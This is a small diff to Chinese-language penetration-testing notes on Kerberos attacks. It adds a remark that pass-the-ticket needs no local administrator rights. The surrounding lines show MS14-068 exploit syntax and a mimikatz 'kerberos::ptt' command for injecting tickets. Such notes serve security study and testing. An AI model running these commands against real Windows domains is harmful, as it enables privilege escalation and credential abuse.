@@ -84,6 +84,8 @@ ms14-068 /user:<userName> /domain:<domainName> /dc:<domainControllerAddr> /sid:<
 mimikatz "kerberos::ptt ticket.kirbi" "exit"
 ```
 
+利用时无须本地管理员权限. 域内用户也能通过以上两种方式 ptt.
+
 注意如果在 windows 2003 中是无法通过 `kerberos::ptt` 和 `kerberos::ptc` 来导入凭据的.
 <!-- markdown end -->
 </xmp>
@@ -142,6 +144,8 @@ mimikatz "kerberos::ptt ticket.kirbi" "exit"
 
 <pre><code>mimikatz "kerberos::ptt ticket.kirbi" "exit"
 </code></pre>
+
+<p>利用时无须本地管理员权限. 域内用户也能通过以上两种方式 ptt.</p>
 
 <p>注意如果在 windows 2003 中是无法通过 <code>kerberos::ptt</code> 和 <code>kerberos::ptc</code> 来导入凭据的.</p>
 <!-- content end -->
